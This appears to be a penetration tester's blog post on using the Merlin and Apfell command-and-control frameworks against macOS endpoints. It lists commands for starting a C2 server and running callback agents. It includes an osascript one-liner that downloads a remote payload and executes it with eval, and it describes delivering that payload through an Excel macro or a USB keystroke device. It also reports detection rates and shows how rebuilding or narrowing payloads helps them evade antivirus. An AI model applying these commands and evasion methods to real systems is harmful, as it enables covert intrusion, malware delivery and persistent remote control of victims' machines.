---
layout: default
title: OSX Pentesting Part-1
permalink: /blog/OSXPenP1
---

# OSX Pentesting Part-1
## A brief foray into OSX C2 Frameworks
*original posted [here](https://chessict.co.uk/blog/av-for-mac-do-you-really-need-it/)*

As a Pentester, I often find myself attempting to identify, * read: shamelessly steal/adapt people's research*, new and intuitive ways to gain access and persistence on Windows endpoints without triggering the AV. My current go-to being a combination of shellcode injection and cobbr's Covenant C2. However, one of the main drawbacks of these frameworks is their limited, or complete lack of, applicable stagers for OSX.

Now I'm sure we've all heard the spiel "Mac's don't get viruses", "Mac AV is a waste of money" etc. but we know that's simply not true. This knowledge, however, doesn't help when you find yourself on an engagement desperately trying to reconfigure payloads because you've landed in the Design department and, of course, all the endpoints on your subnet are OSX.

*Before I go much further, confession time: I have, and love, my MacBook Pro. Since switching to it a few years ago as my daily driver, I couldn't be without it, to the extent that I bought my own to use at work rather than use the Windows laptop provided.*

So here we are, my go-to C2 is .Net based and while the control centre will run on OSX, with some cajoling, there is no OSX stager capability out of the box; enter 'Merlin' and 'Apfell'.


### Merlin

While I've experimented with Ne0nd0g's Merlin C2 on and off for a while, I actually very rarely find myself using it on engagements and I have no idea why. Written in Go, a language I'm actively trying to understand and utilise more, it can easily have agents compiled for Linux,OSX and Windows. One of Merlin's key features is its ability to evade network detection by utilising the HTTP/2 protocol (which most tools are ill-equipped to understand or inspect).

Out of the box, setup is relatively simple. It's just a case of downloading the applicable server and agent binary from the [GitHub repo](https://github.com/Ne0nd0g/merlin/releases). Once you've got the relevant binaries, you can spin up the merlin server from the terminal using the below command.

```python 
merlinServer-Linux-x64 -p 80 -i 0.0.0.0 
```
With 80 signfying the port you wish to listen on and 0.0.0.0 being the interface (in this case all)

![MServerStartup]({{site.url}}/assets/blog/OSXPenP1/MserverStartup.png)

Agent execution is achieved simply by executing the binary on your target host with the relevant details of your C2 server. I leave it to the reader to identify how they might get this binary onto the target host.

```python
merlinAgent-Darwin-x64 -url https://192.168.1.104:80
```

And thats it! We should now have a callback from our OSX target to our C2 server

![MCallBack]({{site.url}}/assets/blog/OSXPenP1/MAgentCallBack.png)

While this is very simple to set up, this simplicity comes with its drawbacks. From an attack vector perspective, the need to drop a binary onto disk and the requirement for a URL flag makes it more complex to trick a user into execution via social engineering. Additionally, the pre-compilation of the agent means it is much more likely to be detected by signature detection, as shown by VirusTotal.

![MVT1]({{site.url}}/assets/blog/OSXPenP1/MVT1.png)

Straight away, we can start to address some of these issues. Instead of utilising the released binary, we can create our own from source. We can also improve our social engineering chances by providing a method for 'one-click' execution by hard coding the connection URL.

```python
make agent-darwin URL=https://192.168.1.104:80
```

Both of these instantly drop the detection rate.
![MVT2]({{site.url}}/assets/blog/OSXPenP1/MVT2.png)

Unfortunately, these changes were not enough to trick the NextGen Sophos AV running on my Mac. At this stage, I would typically look at writing a separate dropper application as well as converting the stager into shellcode to avoid detection. This is both outside of the scope of this small blog and outside of my current OSX coding skills.

### Apfel

ApFell is a recent addition to my C2 arsenal, mainly due to it being directly targeted against *nix-based systems and not Windows. Fundamentally using a Web GUI frontend with docker instances running in the background, setup is achieved relatively easily via an [installation script](https://github.com/its-a-feature/Apfell).

On connecting to the WebGui you can easily review what operations are in progress and choose which one you want to connect to.

![APFellS1]({{site.url}}/assets/blog/OSXPenP1/ApFellS1.png)

Payload generation is similarly streamlined by simply accessing the 'Create Components/Create Payload' menu.

![APFellPayload]({{site.url}}/assets/blog/OSXPenP1/APFellPayload.png)

From this menu, you can customise your attacking payload with the standard information such as encryption key, call-back host/port etc. The most notable element of payload creation is the ability to choose what functionality to include in your payload – a stroke of genius in situations where you're trying to stay undetected.

![APFellPayload2]({{site.url}}/assets/blog/OSXPenP1/APFellPayload2.png)

By restricting the functionality of any initial stager to just that which is required (typically something with command execution). Once a foothold has been achieved you can always include additional functionality in later payloads.

On clicking 'Submit' you can review/host/download your payload from the 'Manage Operations/Manage Payloads' page.

![APFellPayload3]({{site.url}}/assets/blog/OSXPenP1/APFellPayload3.png)

Now, because I'm one - lazy and two - don't like dropping directly malicious files to disk when I can help it, Apfell's ability to host files is definitely another bonus.

![APFellPhosting]({{site.url}}/assets/blog/OSXPenP1/APFellhosting.png)

Though based upon VirusTotal's detection metrics, dropping the resulting file onto the disk is currently unlikely to raise many flags.

![APFellVT1]({{site.url}}/assets/blog/OSXPenP1/APFellVT1.png)

By clicking on 'Config' you can review the settings of your payload, as well as obtain the relevant execution command.

```javascript
osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://domain.com/payload.file')),$.NSUTF8StringEncoding)));"
```

Whilst not exactly the easiest command to trick users into executing, well in the capabilities of a rubber ducky/digispark attack scenario.

![APFellCallback1]({{site.url}}/assets/blog/OSXPenP1/APFellCallback1.png)

It’s not pretty, but it gets the job done, with AV none the wiser.

As stated before, this isn't exactly social engineering friendly – however thanks to Microsoft's inclusion of the VBA command 'Shell' and its cross-platform capabilities, getting this to execute from a macro is straight forward.

![APFellMacro]({{site.url}}/assets/blog/OSXPenP1/APFellMacro.png)

I started to play around with throwing some obfuscation into this (hence the commented out lines), but in the end this wasn't needed and AV lets it sail through with no issues, although the detection rate was increased.

![APFellVT2]({{site.url}}/assets/blog/OSXPenP1/APFellVT2.png)

This is most likely down to using an 'xlsm' to wrap my payload and the AV's in question being a bit twitchy (none of the Enterprise-based AV batted an eye), rather than them identifying the malicious content for what it is.

### Conclusion

Both C2 frameworks have good points and bad points, however on the whole I’d have to say Apfell takes the lead as the better framework when it comes to OSX C2 exploitation. This is primarily due to it providing lower AV detections, dropping fewer files to disk and the ability to customise payloads to fit particular use-cases, rather than being forced to include all capabilities and raising the detection risk. 

In part-2 (whenever I get around to write it), I’ll be looking more at how you can utilise both inbuilt OSX functionality as well as your own tooling to exploit Active Directory from the position of a compromised OSX device.